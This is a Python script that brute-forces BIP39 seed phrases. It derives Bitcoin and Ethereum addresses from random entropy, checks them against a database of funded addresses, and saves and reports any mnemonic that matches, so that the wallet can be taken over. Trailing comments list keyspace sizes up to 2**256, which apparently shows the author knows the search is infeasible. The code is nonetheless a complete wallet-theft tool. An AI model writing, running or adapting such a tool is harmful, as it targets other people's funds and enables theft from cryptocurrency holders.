import os
import random
from tqdm import tqdm
import pyattacker


config = pyattacker.utils.read_config()


def has_balance(mnemonic, db, func_bool=any):
    seed = pyattacker.bip39.mnemonics2seed(mnemonic)

    rtn = [
        db.find(pyattacker.HDKey.seed2address(seed, network))
        for network in [
            "btc-legacy",
            "btc-segwit",
            "eth",
        ]
    ]

    return func_bool(rtn)


def tmp_gen_entropy(i, strength, lim):
    # count up
    # entropy = (i).to_bytes(strength, byteorder="big")[-strength//8:]

    # PRNG
    # entropy = random.randint(1, lim).to_bytes(strength, byteorder="big")[-strength//8:]

    # CSPRNG
    entropy = os.urandom(strength // 8)
    return entropy.hex()


def gen(lim):
    for g in range(lim):
        yield g


def ping(db):
    for entropy in config["PING_DATA"]["entropy"]:
        mnemonic = pyattacker.bip39.generate_mnemonic(entropy)
        assert has_balance(mnemonic, db, func_bool=all)


def found(mnemonic):
    pyattacker.utils.notify(mnemonic)
    with open("found.txt", mode="a", encoding="utf-8") as f:
        f.write(mnemonic + "\n")


@pyattacker.utils.with_timer(template="Delta: {time} (s)")
def run(strength, db):
    assert strength in pyattacker.bip39.SUPPORTED_STRENGTH

    # chunk_bits = 6
    # lim = 2**(11 * (12 - chunk_bits))
    # rng = range(lim)
    lim = 2 ** strength
    rng = gen(lim)

    for i in tqdm(rng, total=lim/2**100):   # small total for show
        entropy = tmp_gen_entropy(i, strength, lim)
        mnemonic = pyattacker.bip39.generate_mnemonic(entropy)

        if has_balance(mnemonic, db):
            print(f"{i}: {mnemonic}")
            found(mnemonic)

        if i % 100000 == 0:
            ping(db)
            print("ping", i)


def main():
    if config["DB_TYPE"] == "sqlite":
        db = pyattacker.db_handlers.DBSqlite()
    elif config["DB_TYPE"] == "postgres":
        db = pyattacker.db_handlers.DBPostgres()
    else:
        raise ValueError(config["DB_TYPE"])

    db.prepare_index()
    run(strength=128, db=db)


if __name__ == "__main__":
    main()


# 2048
# 4194304
# 8589934592
# 17592186044416
# 36028797018963968
# 73786976294838206464
# 151115727451828646838272
# 309485009821345068724781056
# 633825300114114700748351602688
# 1298074214633706907132624082305024
# 2658455991569831745807614120560689152
# 5444517870735015415413993718908291383296

# 2**128
# 340282366920938463463374607431768211456

# 2**256
# 115792089237316195423570985008687907853269984665640564039457584007913129639936
